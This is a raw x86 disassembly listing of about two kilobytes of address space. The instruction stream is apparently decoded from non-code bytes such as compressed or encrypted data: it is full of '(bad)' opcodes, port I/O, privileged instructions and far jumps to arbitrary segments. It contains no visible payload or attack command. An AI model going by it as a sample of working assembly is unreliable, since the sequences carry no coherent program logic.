  421d70:	or     al,BYTE PTR [edi-0xc9718d8]
  421d76:	sbb    bl,bl
  421d78:	retf   0xb3ef
  421d7b:	fimul  WORD PTR [ebp+eiz*4+0xc]
  421d7f:	push   eax
  421d80:	sti    
  421d81:	aam    0x7
  421d83:	add    DWORD PTR [ebx+0x3a],esi
  421d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d87:	ret    
  421d88:	add    al,0x30
  421d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d8b:	push   esi
  421d8c:	add    DWORD PTR [ebp+0x2a62fb32],ecx
  421d92:	js     0x421d78
  421d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d95:	and    eax,0xc57a9d5f
  421d9a:	push   0x73
  421d9c:	cmp    DWORD PTR [edx-0x5f064b33],esp
  421da2:	pop    ebp
  421da3:	mov    cl,0x6c
  421da5:	add    BYTE PTR [eax+0x38],0xa0
  421da9:	sti    
  421daa:	arpl   WORD PTR [ebp-0x5d],ax
  421dad:	dec    ecx
  421dae:	ins    BYTE PTR es:[edi],dx
  421daf:	out    dx,al
  421db0:	jle    0x421e0c
  421db2:	sbb    DWORD PTR [ebx-0x58cef43a],ecx
  421db8:	scas   al,BYTE PTR es:[edi]
  421db9:	add    BYTE PTR [ebx+0x67],ah
  421dbc:	sti    
  421dbd:	or     DWORD PTR [ecx],ecx
  421dbf:	adc    ebp,DWORD PTR [edi+0x664fd82d]
  421dc5:	jno    0x421df2
  421dc7:	scas   al,BYTE PTR es:[edi]
  421dc8:	cmp    DWORD PTR [esi-0x49],0x7
  421dcc:	dec    ebp
  421dcd:	scas   al,BYTE PTR es:[edi]
  421dce:	push   ebp
  421dcf:	pusha  
  421dd0:	cmp    ecx,DWORD PTR [edi+esi*2]
  421dd3:	ss sbb eax,0x322a33ae
  421dd9:	sar    BYTE PTR [edx],cl
  421ddb:	in     al,dx
  421ddc:	lahf   
  421ddd:	push   esi
  421dde:	lods   al,BYTE PTR ds:[esi]
  421ddf:	add    eax,0xacbc59d8
  421de4:	xchg   edx,eax
  421de5:	lock push esp
  421de7:	jge    0x421dd1
  421de9:	retf   0xce9
  421dec:	inc    ebp
  421ded:	loopne 0x421d9c
  421def:	lods   al,BYTE PTR ds:[esi]
  421df0:	xor    eax,0xd1c10145
  421df5:	cmp    bh,BYTE PTR [eax+0xd4b2cb5]
  421dfb:	inc    edi
  421dfc:	int    0x7f
  421dfe:	imul   ecx,DWORD PTR [eax-0x474cf507],0xb09a3e4
  421e08:	in     eax,0x7a
  421e0a:	cmp    al,0x50
  421e0c:	xchg   esp,eax
  421e0d:	or     BYTE PTR [edx],0xf
  421e10:	and    dl,BYTE PTR [ecx+0x46]
  421e13:	mov    ah,0xf7
  421e15:	xlat   BYTE PTR ds:[ebx]
  421e16:	xchg   edi,eax
  421e17:	push   esi
  421e18:	fcom   DWORD PTR [ebp+0x78]
  421e1b:	sub    DWORD PTR [ebx],edx
  421e1d:	mov    ecx,0x2cf71d6c
  421e22:	xchg   esp,eax
  421e23:	and    DWORD PTR [esi+0x1e4ec0d5],0x23dd0eeb
  421e2d:	jecxz  0x421e2f
  421e2f:	mov    bl,0x3
  421e31:	sti    
  421e32:	jnp    0x421eb1
  421e34:	mov    ch,0xa4
  421e36:	sbb    ch,dl
  421e38:	les    edx,FWORD PTR [edi]
  421e3a:	(bad)  
  421e3b:	sbb    eax,0xf440ceda
  421e40:	inc    ebx
  421e41:	lock ret 
  421e43:	mov    eax,ds:0xa43706e0
  421e48:	cmp    esp,0xb38fe04b
  421e4e:	lock xor BYTE PTR ss:[edi],0x90
  421e53:	pusha  
  421e54:	dec    ebx
  421e55:	add    eax,0x4df79911
  421e5a:	cmp    ecx,DWORD PTR [esi-0x3e]
  421e5d:	jae    0x421ec4
  421e5f:	xor    esi,DWORD PTR [ebp-0x12]
  421e62:	or     DWORD PTR [ecx+0x11380def],0x452c9db2
  421e6c:	dec    ebx
  421e6d:	xor    eax,DWORD PTR [edi-0xaa51657]
  421e73:	pop    edi
  421e74:	sbb    al,0x2f
  421e76:	call   0x745f:0xeaee3b44
  421e7d:	sahf   
  421e7e:	mov    BYTE PTR [edx],dl
  421e80:	push   es
  421e81:	add    BYTE PTR [esi+0x77],al
  421e84:	rol    BYTE PTR [eax],cl
  421e86:	dec    ebx
  421e87:	not    DWORD PTR [esi+0x3e]
  421e8a:	and    al,0x8f
  421e8c:	sub    edx,DWORD PTR [esi-0x2d]
  421e8f:	xor    DWORD PTR [ebx+0x4b951603],eax
  421e95:	adc    esp,DWORD PTR [eax+0xbd4357c]
  421e9b:	cmp    DWORD PTR [esi],esp
  421e9d:	mov    edi,0x8dc6c1ad
  421ea2:	cli    
  421ea3:	loop   0x421ecf
  421ea5:	mov    ah,0xd4
  421ea7:	push   eax
  421ea8:	or     BYTE PTR [ebp-0x1b7625ed],ah
  421eae:	les    esp,FWORD PTR [edx-0x1f]
  421eb1:	ret    
  421eb2:	jno    0x421f1e
  421eb4:	xchg   ecx,eax
  421eb5:	fild   DWORD PTR [edi]
  421eb7:	xlat   BYTE PTR ds:[ebx]
  421eb8:	sub    BYTE PTR [edx],dh
  421eba:	popf   
  421ebb:	push   ebp
  421ebc:	ret    0x8bfb
  421ebf:	mov    ecx,0x767090c0
  421ec4:	or     al,0xd8
  421ec6:	pop    esi
  421ec7:	xchg   DWORD PTR [edx-0x2daa8e03],ebp
  421ecd:	lods   eax,DWORD PTR ds:[esi]
  421ece:	dec    esp
  421ecf:	mov    DWORD PTR [edx-0x3d],esi
  421ed2:	jne    0x421f4b
  421ed4:	xchg   edx,eax
  421ed5:	es cwde 
  421ed7:	popf   
  421ed8:	adc    BYTE PTR [eax+eax*4+0x77],0x85
  421edd:	daa    
  421ede:	push   esp
  421edf:	nop
  421ee0:	das    
  421ee1:	jle    0x421ea9
  421ee3:	and    al,0x55
  421ee5:	retf   
  421ee6:	mov    fs,WORD PTR [ebx-0x45]
  421ee9:	pop    esp
  421eea:	imul   esi,DWORD PTR [eax-0x5e],0xeb5e248d
  421ef1:	mov    al,BYTE PTR [esi-0x58]
  421ef4:	in     al,0x8d
  421ef6:	bound  ebp,QWORD PTR [ebx]
  421ef8:	xchg   ecx,eax
  421ef9:	pop    esp
  421efa:	mov    eax,ds:0x8e56fdd4
  421eff:	push   0xb71128a9
  421f04:	inc    esi
  421f05:	pop    ebp
  421f06:	sbb    DWORD PTR [edx+0x72e39c5],eax
  421f0c:	cli    
  421f0d:	in     eax,0xf2
  421f0f:	test   BYTE PTR [ebp-0x36],dh
  421f12:	retf   
  421f13:	repnz mov DWORD PTR [edi*4-0x35d307a2],edi
  421f1b:	ret    0xebff
  421f1e:	out    0xdb,eax
  421f20:	in     al,dx
  421f21:	test   BYTE PTR [ecx+0x3c],bl
  421f24:	jnp    0x421f0f
  421f26:	adc    BYTE PTR [ebx-0x5a72a832],0x36
  421f2d:	dec    ecx
  421f2e:	adc    BYTE PTR [esi+0x5783e6c6],bl
  421f34:	dec    ebp
  421f35:	aaa    
  421f36:	pop    ds
  421f37:	js     0x421f97
  421f39:	xor    al,0x9a
  421f3b:	add    DWORD PTR [edi-0x48d32f28],ebp
  421f41:	mov    cl,0xa9
  421f43:	inc    ebx
  421f44:	sub    eax,0x28260714
  421f49:	or     DWORD PTR [esp+eax*4],esi
  421f4c:	mov    ebp,DWORD PTR [edx]
  421f4e:	fucomip st,st(4)
  421f50:	test   DWORD PTR [edi],esp
  421f52:	(bad)  
  421f53:	adc    cl,BYTE PTR [edx]
  421f55:	leave  
  421f56:	pop    ebx
  421f57:	add    ecx,DWORD PTR [eax]
  421f59:	jno    0x421fb5
  421f5b:	cmp    eax,0x6ed28855
  421f60:	ja     0x421f57
  421f62:	push   ds
  421f63:	cmc    
  421f64:	inc    eax
  421f65:	and    eax,DWORD PTR [ecx+0x19]
  421f68:	ret    
  421f69:	jecxz  0x421f47
  421f6b:	dec    eax
  421f6c:	mov    al,ds:0xe2fad05b
  421f71:	bound  ecx,QWORD PTR [eax-0x36]
  421f74:	fistp  WORD PTR [ebp-0x18]
  421f77:	sar    eax,0x80
  421f7a:	shr    BYTE PTR [edx],cl
  421f7c:	bound  esp,QWORD PTR [esi]
  421f7e:	(bad)  
  421f80:	add    DWORD PTR [edx+eax*1+0x7d7da707],eax
  421f87:	inc    eax
  421f88:	mov    edx,0x6aa013f1
  421f8d:	popa   
  421f8e:	xchg   edx,eax
  421f8f:	xor    dh,BYTE PTR [edx]
  421f91:	(bad)  
  421f92:	out    0x9c,eax
  421f94:	aam    0x9d
  421f96:	nop
  421f97:	int    0x20
  421f99:	je     0x421f30
  421f9b:	in     al,0x7b
  421f9d:	mov    ds:0xdb8be6bd,eax
  421fa2:	and    dh,BYTE PTR [edx+0x75]
  421fa5:	jbe    0x422018
  421fa7:	ja     0x421ff1
  421fa9:	mov    BYTE PTR ds:0xd0b31b1,0x59
  421fb0:	sub    esp,DWORD PTR [ebx+0x7e]
  421fb3:	mov    WORD PTR [eax-0x20],?
  421fb6:	jbe    0x42201f
  421fb8:	in     al,0xac
  421fba:	push   ecx
  421fbb:	cmp    ebx,DWORD PTR [ecx]
  421fbd:	mov    cl,0xb2
  421fbf:	cmp    bh,bh
  421fc1:	dec    ebp
  421fc2:	mov    edi,0xd25a60de
  421fc7:	cmp    ecx,DWORD PTR [esi+0x71dc7bf3]
  421fcd:	scas   eax,DWORD PTR es:[edi]
  421fce:	or     edx,ecx
  421fd0:	and    al,0x57
  421fd2:	mov    ebx,0x184f4b42
  421fd7:	dec    ebx
  421fd8:	lahf   
  421fd9:	adc    eax,0x16297660
  421fde:	dec    ecx
  421fdf:	in     al,dx
  421fe0:	pushf  
  421fe1:	dec    ebx
  421fe2:	cmp    DWORD PTR [edx-0x9],ecx
  421fe5:	in     al,dx
  421fe6:	aas    
  421fe7:	jge    0x422054
  421fe9:	(bad)  
  421fea:	fdivp  st(1),st
  421fec:	mov    bl,dl
  421fee:	gs push esi
  421ff0:	retf   0x852e
  421ff3:	dec    ecx
  421ff4:	test   cl,0xc5
  421ff7:	jbe    0x421f89
  421ff9:	icebp  
  421ffa:	sub    esp,DWORD PTR [ebx+0x55]
  421ffd:	out    0xb2,al
  421fff:	or     DWORD PTR [esi],ebp
  422001:	adc    esp,DWORD PTR [ebp+0x4d]
  422004:	cmp    bh,BYTE PTR [edi]
  422006:	fcmovu st,st(1)
  422008:	neg    BYTE PTR [ebp-0x762e7944]
  42200e:	adc    BYTE PTR [ecx+0x74],ch
  422011:	repz or eax,0xb1ec663a
  422017:	adc    DWORD PTR [ebp+0x329c97e6],0xfac55cb7
  422021:	jbe    0x42200e
  422023:	stos   BYTE PTR es:[edi],al
  422024:	cwde   
  422025:	push   edi
  422026:	fdivr  st(0),st
  422028:	daa    
  422029:	add    ah,BYTE PTR [edi]
  42202b:	push   edx
  42202c:	in     eax,dx
  42202d:	inc    edi
  42202e:	adc    eax,0x79b5c52a
  422033:	icebp  
  422034:	push   eax
  422035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422037:	data16 shl BYTE PTR [eax+ebx*2-0x7e2dba8],0x54
  422040:	jmp    0xa4711406
  422045:	aam    0xc0
  422047:	sti    
  422048:	dec    eax
  422049:	push   0xfffffffa
  42204b:	test   BYTE PTR [eax+0x439428cb],0xfe
  422052:	xor    bh,BYTE PTR [edi-0x26]
  422055:	sbb    bl,BYTE PTR [eax]
  422057:	mov    eax,0x3bb24809
  42205c:	out    0x4d,eax
  42205e:	out    0xd8,eax
  422060:	sbb    al,0xf5
  422062:	data16 sar BYTE PTR [edi-0x7c4d82c8],1
  422069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42206a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42206b:	mov    al,ds:0x4182b9fd
  422070:	xor    al,0x4a
  422072:	or     al,0x12
  422074:	xchg   DWORD PTR [ecx],ebp
  422076:	adc    al,0xc6
  422078:	cmp    edx,edx
  42207a:	and    dl,0x55
  42207d:	lea    ecx,[ebx+0x274532f8]
  422083:	sbb    BYTE PTR [ebx],dl
  422085:	rol    DWORD PTR [ecx],cl
  422087:	sbb    cl,BYTE PTR [edi-0x777715cb]
  42208d:	jl     0x42209f
  42208f:	add    bh,ch
  422091:	sbb    al,0xf9
  422093:	xor    al,0x83
  422095:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  422097:	scas   al,BYTE PTR es:[edi]
  422098:	add    BYTE PTR ds:0x64f9542c,al
  42209e:	arpl   WORD PTR [edi+0x62],dx
  4220a1:	xor    DWORD PTR [ebx],eax
  4220a3:	pop    ebx
  4220a4:	scas   eax,DWORD PTR es:[edi]
  4220a5:	iret   
  4220a6:	into   
  4220a7:	dec    edx
  4220a8:	adc    DWORD PTR [esi-0x2693293d],edx
  4220ae:	lods   eax,DWORD PTR ds:[esi]
  4220af:	cmc    
  4220b0:	dec    esp
  4220b1:	xchg   BYTE PTR [edx],dh
  4220b3:	cmp    al,0xf7
  4220b5:	mov    ah,0x17
  4220b7:	jle    0x42205f
  4220b9:	(bad)  
  4220ba:	shl    ch,1
  4220bc:	jo     0x422062
  4220be:	(bad)  
  4220bf:	jmp    0x6890a20c
  4220c4:	sbb    al,0x2
  4220c6:	std    
  4220c7:	test   al,0x49
  4220c9:	or     al,0x82
  4220cb:	popf   
  4220cc:	js     0x422144
  4220ce:	repnz and dl,ch
  4220d1:	jle    0x422110
  4220d3:	inc    ecx
  4220d4:	cwde   
  4220d5:	mov    bl,0x20
  4220d7:	pushf  
  4220d8:	xor    dh,BYTE PTR [eax]
  4220da:	push   0xe9e0d959
  4220df:	call   0xec639cf7
  4220e4:	jns    0x4220b7
  4220e6:	lock xchg BYTE PTR [ecx-0x65],ch
  4220ea:	adc    DWORD PTR [ecx+0x23b15e6b],edx
  4220f0:	out    dx,eax
  4220f1:	mov    bh,0x2
  4220f3:	adc    dl,BYTE PTR [esi]
  4220f5:	inc    eax
  4220f6:	and    dl,BYTE PTR [edi]
  4220f8:	ficomp DWORD PTR [esi+0x3eba1027]
  4220fe:	out    0x2e,al
  422100:	jge    0x4220a8
  422102:	stos   DWORD PTR es:[edi],eax
  422103:	dec    ecx
  422104:	sbb    al,0x18
  422106:	ds ss popf 
  422109:	inc    edi
  42210a:	adc    eax,0x3f709b2d
  42210f:	cmp    al,0x1
  422111:	(bad)  
  422112:	sahf   
  422113:	push   ds
  422114:	lds    ebx,FWORD PTR [ecx]
  422116:	(bad)  
  422117:	arpl   WORD PTR [edx+0x2e1ec738],di
  42211d:	lea    ebx,[edx]
  42211f:	pop    es
  422120:	in     eax,dx
  422121:	dec    edx
  422122:	mov    edi,DWORD PTR [edi+esi*8-0xa]
  422126:	cmp    eax,0x56b718fd
  42212b:	jmp    DWORD PTR [ebx]
  42212d:	jg     0x4220c2
  42212f:	sbb    BYTE PTR [ebx+0x51d92d06],0x57
  422136:	imul   edi,DWORD PTR [ecx],0x1e
  422139:	adc    edx,esp
  42213b:	ins    BYTE PTR es:[edi],dx
  42213c:	dec    ecx
  42213d:	dec    esi
  42213e:	adc    eax,0x37c9a4f9
  422143:	adc    bh,BYTE PTR [edi-0x78c1fe8f]
  422149:	cmp    esp,DWORD PTR [edi]
  42214b:	jmp    0xe570:0x5bc8fa50
  422152:	adc    eax,0x8e720ca3
  422157:	sub    DWORD PTR ds:0x3b6bfc02,ebp
  42215d:	(bad)  
  42215f:	mov    edi,0x804dd002
  422164:	and    cl,BYTE PTR [ecx]
  422166:	(bad)  
  422167:	in     al,dx
  422168:	imul   ebx,DWORD PTR [esi+edx*4],0xe0442d3e
  42216f:	and    BYTE PTR [edx-0x35adf061],dh
  422175:	and    DWORD PTR [ecx+ebx*4-0xd],ebp
  422179:	push   es
  42217a:	retf   
  42217b:	call   DWORD PTR [ebp+0x5b]
  42217e:	stc    
  42217f:	push   ebp
  422180:	mov    bh,0xa9
  422182:	cdq    
  422183:	cmp    eax,0x639e4c96
  422188:	lods   al,BYTE PTR ds:[esi]
  422189:	leave  
  42218a:	jo     0x4221db
  42218c:	mov    ebx,0xa52958d5
  422191:	xlat   BYTE PTR ds:[ebx]
  422192:	aam    0x4f
  422194:	repz push 0x4f
  422197:	rcr    BYTE PTR [ecx-0x1a574b88],0xe9
  42219e:	xor    al,0x7c
  4221a0:	dec    eax
  4221a1:	cmp    eax,0x25d61d40
  4221a6:	imul   esp,DWORD PTR [edi-0x27],0xc
  4221aa:	idiv   BYTE PTR [edx-0x6af597ae]
  4221b0:	adc    ch,BYTE PTR [ebx]
  4221b2:	repz sbb DWORD PTR [ebx+0x6f427c2e],0x2a
  4221ba:	xchg   esi,eax
  4221bb:	cmc    
  4221bc:	std    
  4221bd:	xor    esp,DWORD PTR [eax]
  4221bf:	leave  
  4221c0:	add    eax,0xbcf041a2
  4221c5:	xchg   ecx,eax
  4221c6:	loope  0x42216a
  4221c8:	sbb    BYTE PTR [esi-0x17],bl
  4221cb:	dec    ebx
  4221cc:	mov    eax,ds:0x28c153bd
  4221d1:	sbb    BYTE PTR [edi+ebx*8],0x49
  4221d5:	outs   dx,DWORD PTR ds:[esi]
  4221d6:	jnp    0x422206
  4221d8:	rcl    DWORD PTR [eax-0x50],1
  4221db:	(bad)  
  4221dc:	mov    esi,0x745b0c80
  4221e1:	cld    
  4221e2:	push   cs
  4221e3:	inc    edx
  4221e4:	inc    ecx
  4221e5:	jmp    DWORD PTR [ebp+0x79]
  4221e8:	call   DWORD PTR [ebp+0x46320d70]
  4221ee:	aad    0x19
  4221f0:	jge    0x4221ec
  4221f2:	ds jmp 0x20db:0x9f0cf773
  4221fa:	cmp    eax,0xe1bc0551
  4221ff:	stos   DWORD PTR es:[edi],eax
  422200:	mov    esi,fs
  422202:	push   ebx
  422203:	mov    ds:0x5914856c,eax
  422208:	loope  0x42222b
  42220a:	shr    BYTE PTR [eax-0xb5b16a8],0xf8
  422211:	iret   
  422212:	js     0x4221c7
  422214:	and    edx,edi
  422216:	les    eax,FWORD PTR [esi]
  422218:	(bad)  
  422219:	mov    eax,ds:0x517a5563
  42221e:	dec    edx
  42221f:	nop
  422220:	cmc    
  422221:	inc    esi
  422222:	fisub  WORD PTR [edx-0x6a81ff1c]
  422228:	mov    ecx,0x37e1f37b
  42222d:	aad    0xae
  42222f:	sbb    al,0xf6
  422231:	imul   eax,DWORD PTR [edx],0x5916a203
  422237:	rol    BYTE PTR [edx+0x5ffb423f],1
  42223d:	(bad)
  422240:	iret   
  422241:	xchg   BYTE PTR [edi],ch
  422243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422244:	(bad)  
  422245:	push   ebx
  422246:	mov    al,0x2a
  422248:	cdq    
  422249:	ins    BYTE PTR es:[edi],dx
  42224a:	pop    edi
  42224b:	call   0x868b:0xfb027db2
  422252:	inc    edx
  422253:	xchg   ebp,eax
  422254:	fsubr  st(2),st
  422256:	mov    ?,WORD PTR [eax]
  422258:	sbb    al,0xe2
  42225a:	fsub   DWORD PTR [ebp-0xf321883]
  422260:	outs   dx,DWORD PTR ds:[esi]
  422261:	or     ah,BYTE PTR [edx+0x11]
  422264:	jle    0x4222da
  422266:	fwait
  422267:	xlat   BYTE PTR ds:[ebx]
  422268:	mov    esi,0x310d56e4
  42226d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42226e:	aad    0x7d
  422270:	jns    0x42221a
  422272:	out    0xc,eax
  422274:	shl    BYTE PTR [edx-0x23],1
  422277:	jge    0x4221fe
  422279:	sbb    eax,0x6296463a
  42227e:	jl     0x42226e
  422280:	lahf   
  422281:	jmp    0x3645:0xb944124b
  422288:	adc    esp,DWORD PTR [edi+0x7fbe0564]
  42228e:	rcr    BYTE PTR [esp+edi*8-0x31d665a5],cl
  422295:	shl    DWORD PTR [ecx-0x728b08ca],cl
  42229b:	les    esp,FWORD PTR [eax+0x2b91dbe8]
  4222a1:	leave  
  4222a2:	loopne 0x42224b
  4222a4:	sbb    ebp,DWORD PTR [edi-0x53]
  4222a7:	and    esi,ebx
  4222a9:	loop   0x4222b4
  4222ab:	ds push ds
  4222ad:	loope  0x422276
  4222af:	retf   
  4222b0:	outs   dx,BYTE PTR ds:[esi]
  4222b1:	pop    esi
  4222b2:	pop    edx
  4222b3:	mov    edi,0x41c6ee2
  4222b8:	sar    DWORD PTR [edi],0x38
  4222bb:	xchg   esi,eax
  4222bc:	jge    0x422246
  4222be:	dec    ecx
  4222bf:	dec    ecx
  4222c0:	inc    ebp
  4222c1:	call   0x3b28:0xf1fe629b
  4222c8:	pop    ds
  4222c9:	rcr    edi,0x90
  4222cc:	xchg   ebp,eax
  4222cd:	mov    cl,0x6c
  4222cf:	in     al,dx
  4222d0:	mov    eax,ds:0xac7983dd
  4222d5:	mov    sp,0xd817
  4222d9:	push   0x56
  4222db:	pop    esp
  4222dc:	dec    ebp
  4222dd:	inc    ecx
  4222de:	leave  
  4222df:	push   ebp
  4222e0:	loop   0x4222b4
  4222e2:	sub    ecx,0xffffffa4
  4222e5:	aad    0xa0
  4222e7:	daa    
  4222e8:	dec    esi
  4222e9:	xchg   ebx,eax
  4222ea:	rcl    BYTE PTR [eax+eiz*8+0x621458eb],1
  4222f1:	and    edi,DWORD PTR [eax+0x9]
  4222f4:	ins    DWORD PTR es:[edi],dx
  4222f5:	mov    bh,0x12
  4222f7:	mov    bl,0x5
  4222f9:	add    al,BYTE PTR [edx]
  4222fb:	jb     0x42230a
  4222fd:	sar    BYTE PTR [ecx],1
  4222ff:	jbe    0x4222a7
  422301:	fcom   DWORD PTR [edx]
  422303:	ficom  WORD PTR [edi+edi*4]
  422306:	or     eax,0x6decf92b
  42230b:	jecxz  0x4222bc
  42230d:	and    BYTE PTR [ebp-0x354a06c5],0x98
  422314:	or     DWORD PTR [esp+ecx*4],0x24f968
  42231b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42231c:	adc    eax,0x50933e5f
  422321:	int3   
  422322:	int    0xa9
  422324:	sar    al,cl
  422326:	dec    eax
  422327:	xchg   edx,eax
  422328:	les    ebp,FWORD PTR [edx+ebx*2+0x7]
  42232c:	mov    DWORD PTR [esi-0x68f2380e],ebx
  422332:	pushf  
  422333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422334:	sbb    ch,BYTE PTR [edx]
  422336:	xchg   esi,eax
  422337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422338:	popa   
  422339:	je     0x4223a3
  42233b:	pop    ebx
  42233c:	xchg   BYTE PTR [ebp+0x2d1cd53e],al
  422342:	(bad)  
  422343:	scas   eax,DWORD PTR es:[edi]
  422344:	out    dx,eax
  422345:	mov    ds:0x4387f63d,eax
  42234a:	pop    ecx
  42234b:	and    eax,0x98f140d7
  422350:	or     dh,bl
  422352:	sub    al,0x38
  422354:	xchg   ecx,eax
  422355:	ins    DWORD PTR es:[edi],dx
  422356:	(bad)  
  422357:	cli    
  422358:	mov    ah,0xfd
  42235a:	out    0x4e,al
  42235c:	mov    eax,0x554e374e
  422361:	ss mov ch,0x18
  422364:	lods   eax,DWORD PTR ds:[esi]
  422365:	sub    BYTE PTR [edx+0x2cc4b02a],dh
  42236b:	sbb    DWORD PTR [ecx-0xf],ecx
  42236e:	in     eax,dx
  42236f:	push   ecx
  422370:	ds pop esp
  422372:	dec    esp
  422373:	shl    BYTE PTR [ebp-0x2e],1
  422376:	add    ecx,DWORD PTR es:[edi+0x76]
  42237a:	lods   eax,DWORD PTR ds:[esi]
  42237b:	xchg   sp,ax
  42237d:	mov    ds:0xfb469ccf,al
  422382:	or     edi,DWORD PTR ds:0xf1fa55ff
  422388:	ds mov gs,edi
  42238b:	mov    edx,0x3bf37880
  422390:	xor    ch,dh
  422392:	and    ebx,ecx
  422394:	mov    BYTE PTR [eax+edx*4+0x30],cl
  422398:	xchg   edx,eax
  422399:	aad    0x59
  42239b:	test   eax,0x93f63128
  4223a0:	mov    cs,WORD PTR [edx-0x6f3aef1d]
  4223a6:	xor    ebp,eax
  4223a8:	xor    eax,0xac8685b1
  4223ad:	and    ch,BYTE PTR [edi+0x20]
  4223b0:	jp     0x4223a4
  4223b2:	xchg   dl,cl
  4223b4:	stos   BYTE PTR es:[edi],al
  4223b5:	loope  0x4223cb
  4223b7:	cdq    
  4223b8:	xor    DWORD PTR [ecx],esi
  4223ba:	pop    esi
  4223bb:	gs xchg ecx,eax
  4223bd:	add    DWORD PTR [edi+0x231eecc7],edx
  4223c3:	mov    esi,0x1204fe7f
  4223c8:	mov    ebp,0xdbd61615
  4223cd:	les    ebx,FWORD PTR [edi+edi*4]
  4223d0:	fidivr DWORD PTR [ebx-0x17]
  4223d3:	xchg   dh,bh
  4223d5:	mov    ch,0x88
  4223d7:	ins    BYTE PTR es:[edi],dx
  4223d8:	cld    
  4223d9:	dec    ecx
  4223da:	mov    ebp,es
  4223dc:	ss cwde 
  4223de:	dec    edi
  4223df:	imul   BYTE PTR [esi]
  4223e1:	test   al,0xbd
  4223e3:	jbe    0x422447
  4223e5:	ds push ebx
  4223e7:	sbb    cl,BYTE PTR [eax-0x45]
  4223ea:	mov    WORD PTR [ecx+0x22],fs
  4223ed:	mov    eax,ds:0x45b1708d
  4223f2:	adc    al,0xde
  4223f4:	(bad)  
  4223f5:	sbb    ah,BYTE PTR [ecx]
  4223f7:	or     esp,DWORD PTR [edx+0x5f543c44]
  4223fd:	ins    BYTE PTR es:[edi],dx
  4223fe:	test   al,0x1d
  422400:	adc    DWORD PTR [edi+0x6a71e854],esi
  422406:	lds    ecx,FWORD PTR [ebp+ecx*8+0x46]
  42240a:	out    dx,eax
  42240b:	pop    esi
  42240c:	dec    ecx
  42240d:	xchg   edi,eax
  42240e:	mov    BYTE PTR [ebx],0xe4
  422411:	lahf   
  422412:	in     al,0xa3
  422414:	push   ds
  422415:	fwait
  422416:	and    ah,BYTE PTR [ebx-0x34]
  422419:	and    al,0xc7
  42241b:	xor    BYTE PTR ds:0x966a8359,0x67
  422422:	call   0xa31cab71
  422427:	or     eax,0x4958c1ae
  42242c:	shl    BYTE PTR [edx],1
  42242e:	cli    
  42242f:	mov    al,ds:0x9c078902
  422434:	lahf   
  422435:	int3   
  422436:	push   esp
  422437:	dec    edi
  422438:	dec    edx
  422439:	xor    eax,0xcf4f4dd9
  42243e:	push   ss
  42243f:	out    dx,eax
  422440:	in     al,dx
  422441:	aad    0xb9
  422443:	mov    al,ds:0xe4b5451d
  422448:	shr    DWORD PTR [esi-0x4c995168],1
  42244e:	jo     0x42242f
  422450:	ret    
  422451:	ret    
  422452:	add    eax,DWORD PTR gs:[ebx]
  422455:	xor    ah,BYTE PTR [ebx+0x10c3793c]
  42245b:	push   ebx
  42245c:	sub    al,0xea
  42245e:	daa    
  42245f:	dec    esi
  422460:	push   ss
  422461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422462:	jne    0x4224cc
  422464:	aas    
  422465:	inc    eax
  422466:	inc    eax
  422467:	mov    edi,0xe164c20d
  42246c:	and    ebp,edi
  42246e:	adc    ecx,DWORD PTR [ebp+0x3680b6e1]
  422474:	mov    dh,BYTE PTR [ecx]
  422476:	xchg   ebx,eax
  422477:	js     0x422484
  422479:	mov    ebx,0xf7837f45
  42247e:	jmp    0x422475
  422480:	scas   al,BYTE PTR es:[edi]
  422481:	enter  0xbfca,0x1b
  422485:	add    DWORD PTR [edi+0x33a866a],ebx
  42248b:	sbb    BYTE PTR [ecx+ebx*8+0x1dd3d517],ch
  422492:	cli    
  422493:	mov    eax,ds:0xd5a0ab0a
  422498:	aad    0xce
  42249a:	or     eax,0xb8419eac
  42249f:	inc    esi
  4224a0:	int3   
  4224a1:	pop    eax
  4224a2:	cmc    
  4224a3:	or     eax,0x232be052
  4224a8:	(bad)  
  4224a9:	enter  0xca3f,0x7
  4224ad:	push   eax
  4224ae:	mov    eax,0xdcfff6c7
  4224b3:	adc    BYTE PTR [ebp+eiz*1+0x719395ef],dh
  4224ba:	adc    eax,edi
  4224bc:	pop    eax
  4224bd:	mov    al,0xce
  4224bf:	lods   eax,DWORD PTR ds:[esi]
  4224c0:	ret    0xd67d
  4224c3:	cmp    al,0x82
  4224c5:	fidivr WORD PTR [esi]
  4224c7:	fnstcw WORD PTR [edi-0x5b]
  4224ca:	inc    esi
  4224cb:	xor    ah,cl
  4224cd:	sub    al,0x4f
  4224cf:	jge    0x42254b
  4224d1:	aas    
  4224d2:	cwde   
  4224d3:	add    BYTE PTR [ebp-0x39f8ad1a],0x54
  4224da:	out    dx,al
  4224db:	inc    esi
  4224dc:	(bad)  [ebp-0x1eb014c0]
  4224e2:	mov    ds:0xf2b75ffa,al
  4224e7:	push   ss
  4224e8:	je     0x4224e5
  4224ea:	das    
  4224eb:	icebp  
  4224ec:	repz (bad) 
  4224ee:	lods   al,BYTE PTR ds:[esi]
  4224ef:	outs   dx,BYTE PTR ds:[esi]
  4224f0:	push   edi
  4224f1:	sub    al,0x85
  4224f3:	jb     0x4224d3
  4224f5:	and    DWORD PTR [edi-0x14c2c851],esp
  4224fb:	cmp    BYTE PTR [edx-0x4b],dl
  4224fe:	cld    
  4224ff:	test   eax,0x9913da93
  422504:	add    edx,0x52572d3a
  42250a:	dec    ecx
  42250b:	repnz imul ebp,DWORD PTR [edi],0x932da410
  422512:	test   DWORD PTR [esi-0x2f5e3157],edx
  422518:	mov    edx,0xafebac99
  42251d:	sub    eax,0x7ac31f42
  422522:	and    BYTE PTR [esi+0x7554798c],ch
  422528:	sub    bl,al
  42252a:	shr    ebp,1
  42252c:	test   ah,0x10
  42252f:	ret    0xaf75
  422532:	mov    cl,0xdb
  422534:	add    bl,ah
  422536:	xchg   esp,eax
